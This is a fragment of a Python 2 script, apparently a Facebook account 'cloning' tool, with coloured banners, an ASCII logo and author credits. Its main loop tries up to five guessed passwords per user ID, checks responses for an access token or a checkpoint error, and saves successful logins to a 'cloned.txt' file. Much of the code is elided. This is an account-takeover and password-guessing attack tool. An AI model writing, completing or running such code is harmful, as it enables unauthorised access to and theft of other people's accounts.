...
\033[1;94mFACEBOOK  Hashan Robiul
                  

"""

####Logo####
logo1 = """  ______     ______     __         __     __    __     ______     __   __    
/\  ___\   /\  __ \   /\ \       /\ \   /\ "-./  \   /\  __ \   /\ "-.\ \   
\ \___  \  \ \ \/\ \  \ \ \____  \ \ \  \ \ \-./\ \  \ \  __ \  \ \ \-.  \  
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                print '\x1b[1;93m(MD-SOLAIMAN-OK)  ' + k + c + user + '  |  ' + pass1                                       
                ...
                if 'www.facebook.com' in q['error_msg']:
                    print '\033[1;97m(MD-SOLAIMAN-CP) ' + k + c + user + '  |  ' + pass1
                    ...
                    q = json.load(data)
                    if 'access_token' in q:
                        print '\x1b[1;93m(MD-SOLAIMAN-OK)  ' + k + c + user +  '  |  ' + pass2
                        okb = open('save/cloned.txt', 'a')
                        ...
                        if 'www.facebook.com' in q['error_msg']:
                            print '\033[1;97m(MD-SOLAIMAN-CP) ' + k + c + user + '  |  ' + pass2
                            cps = open('save/cloned.txt', 'a')
                            ...
                            q = json.load(data)
                            if 'access_token' in q:
                                print '\x1b[1;93m(MD-SOLAIMAN-OK)  ' + k + c + user + '  |  ' + pass3
                                okb = open('save/cloned.txt', 'a')
                                ...
                                if 'www.facebook.com' in q['error_msg']:
                                    print '\033[1;97m(MD-SOLAIMAN-CP) ' + k + c + user + '  |  ' + pass3 
                                    cps = open('save/cloned.txt', 'a')
                                    ...
                                    q = json.load(data)
                                    if 'access_token' in q:
                                        print '\x1b[1;93m(MD-SOLAIMAN-OK)  ' + k + c + user + '  |  ' + pass4 
                                        okb = open('save/cloned.txt', 'a')
                                        ...
                                        if 'www.facebook.com' in q['error_msg']:
                                            print '\033[1;97m(MD-SOLAIMAN-CP) ' + k + c + user + '  |  ' + pass4
                                            cps = open('save/cloned.txt', 'a')
                                            ...
                                            q = json.load(data)
                                            if 'access_token' in q:
                                                print '\x1b[1;93m(MD-SOLAIMAN-OK)  ' + k + c + user + '  |  ' + pass5
                                                okb = open('save/cloned.txt', 'a')
...
\033[1;95mFb\033[1;97mJohn Ry Adona"""
